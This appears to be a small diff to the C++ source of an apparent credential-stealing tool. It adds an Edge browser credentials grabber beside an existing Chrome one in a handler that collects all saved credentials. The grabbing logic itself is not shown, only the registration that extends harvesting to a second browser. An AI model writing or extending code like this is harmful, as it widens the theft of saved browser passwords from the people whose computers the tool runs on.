@@ -2,6 +2,7 @@
 
 #include "Trace.hpp"
 #include "../Grabbers/ChromeCredentialsGrabber.hpp"
+#include "../Grabbers/EdgeCredentialsGrabber.hpp"
 #include "Products/TextTypedProduct.hpp"
 #include "Utils/Strings.hpp"
 
@@ -59,6 +60,7 @@ std::vector<CredentialsGrabber::Ptr> GetAllCredentialsHandler::make_grabbers()
 	std::vector<CredentialsGrabber::Ptr> result;
 
 	result.push_back(std::make_unique<ChromeCredentialsGrabber>());
+	result.push_back(std::make_unique<EdgeCredentialsGrabber>());
 
 	return result;
 }
